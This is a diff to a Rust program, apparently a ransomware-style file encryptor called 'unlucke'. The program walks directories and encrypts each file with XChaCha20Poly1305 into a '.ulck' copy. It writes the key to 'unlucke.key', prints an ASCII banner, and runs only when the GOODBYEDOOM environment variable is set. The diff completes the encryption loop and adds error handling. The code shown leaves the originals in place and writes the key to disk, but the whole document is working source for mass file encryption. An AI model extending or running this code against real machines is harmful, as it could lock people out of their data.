@@ -1,24 +1,33 @@
 #![allow(non_snake_case)]
 
 use chacha20poly1305::{
-    aead::{stream, Aead, AeadCore, KeyInit, OsRng},
-    Nonce, XChaCha20Poly1305,
+    aead::{stream, KeyInit, OsRng},
+    XChaCha20Poly1305,
 };
 use rand::{distributions::Alphanumeric, RngCore};
 use rand::{thread_rng, Rng};
 use std::{
     env,
     fs::{self, File},
-    io::Write,
+    io::{self, Read, Write},
     thread,
 };
 
 static MAX_FILE_SIZE: u64 = 1000000000;
+static COOL_TEXT: &str = r#"  __    __  __    __  __        __    __   ______   __    __  ________
+ /  |  /  |/  \  /  |/  |      /  |  /  | /      \ /  |  /  |/        |
+ $$ |  $$ |$$  \ $$ |$$ |      $$ |  $$ |/$$$$$$  |$$ | /$$/ $$$$$$$$/
+ $$ |  $$ |$$$  \$$ |$$ |      $$ |  $$ |$$ |  $$/ $$ |/$$/  $$ |__
+ $$ |  $$ |$$$$  $$ |$$ |      $$ |  $$ |$$ |      $$  $$<   $$    |
+ $$ |  $$ |$$ $$ $$ |$$ |      $$ |  $$ |$$ |   __ $$$$$  \  $$$$$/
+ $$ \__$$ |$$ |$$$$ |$$ |_____ $$ \__$$ |$$ \__/  |$$ |$$  \ $$ |_____
+ $$    $$/ $$ | $$$ |$$       |$$    $$/ $$    $$/ $$ | $$  |$$       |
+  $$$$$$/  $$/   $$/ $$$$$$$$/  $$$$$$/   $$$$$$/  $$/   $$/ $$$$$$$$/"#;
 
-fn runFile(sourceFilePath: &str, key: &str) {
-    let metadata = File::open(sourceFilePath).unwrap().metadata().unwrap();
+fn runFile(sourceFilePath: &str, key: &str) -> Result<(), io::Error> {
+    let metadata = File::open(sourceFilePath)?.metadata()?;
     if metadata.len() == 0 || metadata.len() > MAX_FILE_SIZE {
-        return;
+        return Ok(());
     }
 
     let destinationFilePath = sourceFilePath.to_owned() + ".ulck";
@@ -27,13 +36,41 @@ fn runFile(sourceFilePath: &str, key: &str) {
     OsRng.fill_bytes(&mut nonce);
 
     let aead = XChaCha20Poly1305::new(key.as_bytes().into());
-    let mut stream_encryptor = stream::EncryptorBE32::from_aead(aead, nonce.as_ref().into());
+    let mut streamEncryptor = stream::EncryptorBE32::from_aead(aead, nonce.as_ref().into());
 
     const BUFFER_LEN: usize = 500;
     let mut buffer = [0u8; BUFFER_LEN];
 
-    let mut source_file = File::open(sourceFilePath);
-    let mut dist_file = File::create(destinationFilePath);
+    let mut sourceFile = File::open(sourceFilePath)?;
+    let mut distFile = File::create(destinationFilePath)?;
+
+    loop {
+        let read_count = sourceFile.read(&mut buffer)?;
+
+        if read_count == BUFFER_LEN {
+            let ciphertext = streamEncryptor.encrypt_next(buffer.as_slice());
+
+            match ciphertext {
+                Ok(ciphertext) => {
+                    distFile.write(&ciphertext)?;
+                }
+                Err(_) => break,
+            }
+        } else {
+            let ciphertext = streamEncryptor.encrypt_last(&buffer[..read_count]);
+
+            match ciphertext {
+                Ok(ciphertext) => {
+                    distFile.write(&ciphertext)?;
+                }
+                Err(_) => break,
+            }
+
+            break;
+        }
+    }
+
+    Ok(())
 }
 
 fn runDirEntry(dirEntryPath: &str, key: &str) {
@@ -70,6 +107,8 @@ fn runDirEntry(dirEntryPath: &str, key: &str) {
 }
 
 fn main() {
+    println!("\n\n{}\n\n\n", COOL_TEXT);
+
     match env::var("GOODBYEDOOM") {
         Ok(_) => (),
         Err(_) => panic!("GOODBYEDOOM not set"),
@@ -94,11 +133,10 @@ fn main() {
     let mut keyPath: String = entryPath.clone();
     keyPath.push_str(r#"\unlucke.key"#);
 
-    println!(r#"Writing key at {}"#, keyPath);
+    println!(r#"Writing key at {}. Key: {}"#, keyPath, key);
 
     let mut keyFile = File::create(&keyPath).unwrap();
     keyFile.write_all(key.as_bytes()).unwrap();
-
     let dirEntries = fs::read_dir(&entryPath).unwrap();
     for dirEntry in dirEntries {
         match dirEntry {
@@ -109,6 +147,4 @@ fn main() {
             Err(_) => (),
         }
     }
-
-    println!("{}", key);
 }
